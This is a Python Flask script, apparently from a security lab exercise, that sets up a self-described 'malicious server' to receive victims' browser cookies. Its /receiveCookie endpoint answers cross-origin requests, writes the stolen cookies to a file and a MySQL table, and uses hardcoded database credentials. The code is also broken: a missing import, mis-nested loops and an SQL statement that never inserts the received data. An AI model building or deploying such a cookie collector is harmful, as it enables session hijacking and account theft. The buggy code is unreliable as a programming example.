#PLAN: 
#    Learn + use Flask
#    Find out how to run a 2nd server simultaneously
#    Use malicious server to get victim's cookies

from flask import Flask, request, redirect, send_file, make_response
from flask_cors import CORS
import mysql.connector

app = Flask(__name__)
CORS(app)

@app.route('/', methods=['GET']) 
def index():
    return '''
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>malicious server</title>
  </head>
  <body>
    <h1>Hello! Here is malicious server!</h1>
  </body>
</html>
    '''
    
@app.route('/receiveCookie',methods=['POST', 'OPTIONS'])
def receive_cookie():
    # Handle COR preflight request
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Allow-Origin', 'https://localhost')
        response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
        response.headers.add('Access-Control-Allow-Methods', 'POST')
        response.headers.add('Access-Control-Allow-Credentials', 'true')
        return response
        
    json_cookies = request.get_json()
    file= open('cookie.txt','a+')
    for line in json_cookies:
    	data = json.loads(line.strip())
    for item in data:
    	file.write(item)
    	print(item)
    #cookieburglar = request.getReader()
    #f = open("/home/tic/Documents/cookies.txt","a")
    #f.write(cookieburglar+ ' ' + '\n')
    #f.close()
    
    conn = mysql.connector.connect(user='lsuser', password='tic123', database='loginsystem')
    cursor = conn.cursor()
    insert_cookie = ("insert into cookies (cookie) values (json_cookies);")
    
    cursor.execute(insert_cookie)
    conn.commit()
    cursor.close()
    conn.close()
    
    response = make_response()
    response.headers.add('Access-Control-Allow-Origin', 'https://localhost')
    response.headers.add('Access-Control-Allow-Credentials', 'true')
    return(response, 204)


if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=5000)
